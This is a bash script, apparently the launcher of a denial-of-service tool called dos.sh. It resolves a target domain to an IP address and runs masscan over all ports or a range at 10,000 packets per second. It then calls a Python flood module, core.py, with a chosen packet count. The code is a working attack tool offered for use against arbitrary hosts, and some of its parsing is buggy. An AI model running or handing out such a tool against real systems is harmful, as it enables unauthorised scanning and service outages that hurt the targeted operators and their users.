#!/bin/bash

function help(){
echo "-h|--help show help"
echo "-p|--port select espisific port if no set scan all port"
echo "-d|--domain set your domain"
echo "-i|--ip set your ip"
echo "-f|--flood set Number of packet you want to send" 
echo "-r|--range set range of port scan and format is 1-8080"
echo "usage:"
echo "./dos.sh -d domain.com"

}


hash masscan 2> /dev/null
if [ $? -eq 1 ]
then
    sudo apt install masscan
fi

hash scapy 2> /dev/null
if [ $? -eq 1 ]
then
    sudo apt install python-scapy
fi

hash python3 2> /dev/null
if [ $? -eq 1 ]
then
    sudo apt install python3
fi

hash python2.7 2> /dev/null
if [ $? -eq 1 ]
then
    sudo apt install python2.7
fi


if [ $# -eq 0 ]
then 
help
exit 1
fi
FLOOD=100
while [ $# -ne 0 ]
do
   case $1 in
   -h)
      help
      exit 1
    ;;
      --help)
	  help
      exit 1
    ;;
   -d)
      DOMAIN=$2
      shift
   ;; 
   --domain)
      DOMAIN=$2
      shift
   ;;
  -p)
      PORT=$2
      shift
   ;;
      --port)
      PORT=$2
      shift
   ;;
  -i)
      IP=$2
      shift
   ;;
  --ip)
      IP=$2
      shift
   ;;
   -f)
	  FLOOD=$2
	  shift
   ;;
   --flood)
      FLOOD=$2
	  shift
   ;;
   -r)
      RANGE=$2
	  shift
	;;
	--range)
	  RANGE=$2
	  shift
	;;
   *)
      help
      exit 1
 esac	
shift
done

if [ -z $IP ]
then
IP=`ping $DOMAIN -c1| head -1| awk '{print $3}'| tr -d \)| tr -d \(`
fi





if [ -z $PORT ] && [ -z $RANGE ]
then
PORT=`sudo masscan -p1-65535 $IP  --wait=10 --rate=10000  `
echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
elif [ $RANGE -ne 0 ]
then
PORT=`sudo masscan -p $RANGE $IP  --wait=10 --rate=10000  `
echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
else
echo $PORT > /tmp/OPEN_PORT
fi

echo $IP > /tmp/IP
cat /tmp/IP | head -1 > /tmp/IP2

if [ $PORT -eq 0 ]
then
PORT=`sudo masscan -p1-250 $IP  --wait=1 --rate=10000  `
echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
else
echo $PORT > /tmp/OPEN_PORT

fi

echo $PORT
sudo python core.py $FLOOD

rm -rf /tmp/IP2
rm -rf /tmp/OPEN_PORT
rm -rf /tmp/IP